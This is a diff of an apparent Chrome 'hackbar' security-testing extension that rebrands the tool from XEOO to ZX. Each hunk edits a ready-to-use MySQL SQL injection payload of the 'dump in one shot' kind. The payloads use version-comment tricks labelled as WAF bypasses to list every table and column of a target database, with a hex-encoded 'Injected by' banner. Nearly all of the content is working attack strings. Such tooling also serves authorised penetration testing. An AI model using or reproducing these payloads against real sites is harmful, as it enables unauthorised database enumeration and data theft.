@@ -1,5 +1,5 @@
 /**
- * XEOO HACKBAR — Security Testing & HTTP Inspection Chrome Extension
+ * ZX HACKBAR — Security Testing & HTTP Inspection Chrome Extension
  * 
  * @module WafBasedDiosMysql
  * @author Zone Xploiter / ZXMarchia
@@ -446,7 +446,7 @@ const classicWafSignaturesDiosTemplates: BuilderTemplate[] = [
     group: 'Classic WAF Signatures (Author / Popular Payloads)',
     tags: ['waf-bypass', 'signature', 'zxmarchia', 'neon-green'],
     description: 'Signature ZXMarchia tebal hijau neon terbungkus komentar versi MySQL /*!50000...*/',
-    content: "(/*!50000SELECT*/(@ntt)/*!50000FROM*/(/*!50000SELECT*/(@ntt:=0x3c666f6e7420636f6c6f723d234133464637303e3c623e5b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@ntt)/*!50000AND*/(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
+    content: "(/*!50000SELECT*/(@ntt)/*!50000FROM*/(/*!50000SELECT*/(@ntt:=0x3c666f6e7420636f6c6f723d234133464637303e3c623e5b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@ntt)/*!50000AND*/(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
   },
   {
     id: 'waf-dios-sig-zxmarchia-red',
@@ -454,7 +454,7 @@ const classicWafSignaturesDiosTemplates: BuilderTemplate[] = [
     group: 'Classic WAF Signatures (Author / Popular Payloads)',
     tags: ['waf-bypass', 'signature', 'zxmarchia', 'neon-red'],
     description: 'Signature ZXMarchia tebal merah menyala dengan pelindung WAF comment delimiters',
-    content: "(/*!50000SELECT*/(@ntt)/*!50000FROM*/(/*!50000SELECT*/(@ntt:=0x3c666f6e7420636f6c6f723d234646333334343e3c623e5b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@ntt)/*!50000AND*/(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
+    content: "(/*!50000SELECT*/(@ntt)/*!50000FROM*/(/*!50000SELECT*/(@ntt:=0x3c666f6e7420636f6c6f723d234646333334343e3c623e5b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@ntt)/*!50000AND*/(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
   },
   {
     id: 'waf-dios-sig-zxmarchia-cyan',
@@ -462,7 +462,7 @@ const classicWafSignaturesDiosTemplates: BuilderTemplate[] = [
     group: 'Classic WAF Signatures (Author / Popular Payloads)',
     tags: ['waf-bypass', 'signature', 'zxmarchia', 'cyber-cyan'],
     description: 'Signature ZXMarchia biru elektrik menyala berpemisah komentar versi',
-    content: "(/*!50000SELECT*/(@ntt)/*!50000FROM*/(/*!50000SELECT*/(@ntt:=0x3c666f6e7420636f6c6f723d233030464646463e3c623e5b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@ntt)/*!50000AND*/(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
+    content: "(/*!50000SELECT*/(@ntt)/*!50000FROM*/(/*!50000SELECT*/(@ntt:=0x3c666f6e7420636f6c6f723d233030464646463e3c623e5b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@ntt)/*!50000AND*/(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
   },
   {
     id: 'waf-dios-sig-zxmarchia-ascii',
@@ -470,7 +470,7 @@ const classicWafSignaturesDiosTemplates: BuilderTemplate[] = [
     group: 'Classic WAF Signatures (Author / Popular Payloads)',
     tags: ['waf-bypass', 'signature', 'zxmarchia', 'ascii-frame'],
     description: 'Header ASCII frame ZXMarchia dengan bypass komentar versi MySQL',
-    content: "(/*!50000SELECT*/(@ntt)/*!50000FROM*/(/*!50000SELECT*/(@ntt:=0x0a3d3d3d205b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d203d3d3d0a),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@ntt)/*!50000AND*/(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
+    content: "(/*!50000SELECT*/(@ntt)/*!50000FROM*/(/*!50000SELECT*/(@ntt:=0x0a3d3d3d205b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d203d3d3d0a),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000information_schema.columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@ntt)/*!50000AND*/(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
   },
   {
     id: 'waf-dios-sig-zxmarchia-sys-bypass',
@@ -478,7 +478,7 @@ const classicWafSignaturesDiosTemplates: BuilderTemplate[] = [
     group: 'Classic WAF Signatures (Author / Popular Payloads)',
     tags: ['waf-bypass', 'signature', 'zxmarchia', 'sys-schema'],
     description: 'Header ZXMarchia Neon Green dengan tabel sistem sys.schema_auto_increment_columns',
-    content: "(/*!50000SELECT*/(@n)/*!50000FROM*/(/*!50000SELECT*/(@n:=0x3c666f6e7420636f6c6f723d234133464637303e3c623e5b20496e6a6563746564206279205a584d617263686961202d2058656f6f204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000sys.schema_auto_increment_columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@n)/*!50000AND*/(@n:=concat(@n,0x0a,table_name,0x3a,column_name))))n)"
+    content: "(/*!50000SELECT*/(@n)/*!50000FROM*/(/*!50000SELECT*/(@n:=0x3c666f6e7420636f6c6f723d234133464637303e3c623e5b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(/*!50000SELECT*/(0)/*!50000FROM*/(/*!50000sys.schema_auto_increment_columns*/)/*!50000WHERE*/(table_schema=database())/*!50000AND*/(@n)/*!50000AND*/(@n:=concat(@n,0x0a,table_name,0x3a,column_name))))n)"
   },
   {
     id: 'waf-dios-sig-sec-ninja',
